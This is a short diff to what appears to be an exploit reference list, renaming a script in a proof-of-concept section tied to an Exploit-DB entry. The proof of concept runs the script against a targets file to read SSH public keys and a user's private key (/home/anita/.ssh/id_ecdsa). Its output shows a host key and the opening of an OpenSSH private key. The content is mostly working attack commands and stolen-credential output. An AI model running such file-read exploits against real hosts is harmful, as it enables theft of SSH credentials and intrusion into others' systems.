@@ -261,10 +261,10 @@ CVE-2018-18619 https://www.exploit-db.com/exploits/45853 Advanced Comment System
 
 ###### POC
 ````
-./exploit.sh targets.txt /etc/ssh/*pub
+./50383.sh targets.txt /etc/ssh/*pub
 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@web01
 
-./exploit.sh targets.txt /home/anita/.ssh/id_ecdsa
+./50383.sh targets.txt /home/anita/.ssh/id_ecdsa
 192.168.138.245:8000
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
